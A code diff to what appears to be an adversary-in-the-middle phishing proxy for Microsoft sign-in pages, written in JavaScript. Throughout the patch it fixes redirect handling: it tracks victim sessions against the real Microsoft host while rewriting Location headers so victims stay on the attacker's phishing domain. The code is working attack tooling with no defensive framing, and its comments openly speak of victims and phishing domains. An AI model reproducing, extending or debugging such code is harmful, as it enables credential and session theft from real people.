@@ -481,31 +481,34 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
         console.log(`[REDIRECT DEBUG] isNav=${isNavigationRequest}, reqHost=${proxyRequestOptions.headers.host}, sessHost=${VICTIM_SESSIONS[currentSession].host}, status=${proxyResponse.statusCode}`);
 
         // ---- REWRITE ALL 3xx REDIRECTS (CORS + NAVIGATION + ANY HOST) ----
-// ---- REWRITE ALL 3xx REDIRECTS (using REVERSE_MAPPING) ----
+// ---- REWRITE ALL 3xx REDIRECTS ----
 if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
     const location = proxyResponse.headers.location;
     if (location) {
-        let newLocation = location;
-        // Replace all known Microsoft domains with your phishing domain
-        for (const [real, phish] of Object.entries(REVERSE_MAPPING)) {
-            newLocation = newLocation.replace(new RegExp(real, 'g'), phish);
-        }
-        proxyResponse.headers.location = newLocation;
-        console.log(`[REDIRECT] ${location} → ${newLocation}`);
-
-        // ---- Update session target to the new host (if it's a different domain) ----
         try {
-            const newUrl = new URL(newLocation);
-            // Only update if the host changed
-            if (newUrl.host !== VICTIM_SESSIONS[currentSession].host) {
-                VICTIM_SESSIONS[currentSession].protocol = newUrl.protocol;
-                VICTIM_SESSIONS[currentSession].hostname = newUrl.hostname;
-                VICTIM_SESSIONS[currentSession].path = newUrl.pathname + newUrl.search;
-                VICTIM_SESSIONS[currentSession].port = newUrl.port;
-                VICTIM_SESSIONS[currentSession].host = newUrl.host;
-                console.log(`[SESSION] Updated target to ${newUrl.host}`);
+            const locationUrl = new URL(location);
+            const realHost = locationUrl.hostname;
+
+            // ---- Update session target to the REAL Microsoft domain ----
+            if (realHost !== VICTIM_SESSIONS[currentSession].hostname) {
+                VICTIM_SESSIONS[currentSession].protocol = locationUrl.protocol;
+                VICTIM_SESSIONS[currentSession].hostname = realHost;
+                VICTIM_SESSIONS[currentSession].port = locationUrl.port || (locationUrl.protocol === 'https:' ? 443 : 80);
+                VICTIM_SESSIONS[currentSession].path = locationUrl.pathname + locationUrl.search;
+                VICTIM_SESSIONS[currentSession].host = locationUrl.host;
+                console.log(`[SESSION] Updated target to ${realHost}`);
             }
-        } catch (e) {}
+
+            // ---- Rewrite Location for client to phishing domain ----
+            let newLocation = location;
+            for (const [real, phish] of Object.entries(REVERSE_MAPPING)) {
+                newLocation = newLocation.replace(new RegExp(real, 'g'), phish);
+            }
+            proxyResponse.headers.location = newLocation;
+            console.log(`[REDIRECT] ${location} → ${newLocation}`);
+        } catch (e) {
+            console.error(`[REDIRECT] Error: ${e.message}`);
+        }
     }
 } else if (proxyResponse.statusCode > 400) {
     displayError("Server response status", proxyResponse.statusCode, proxyRequestOptions.headers.host, proxyRequestOptions.path);
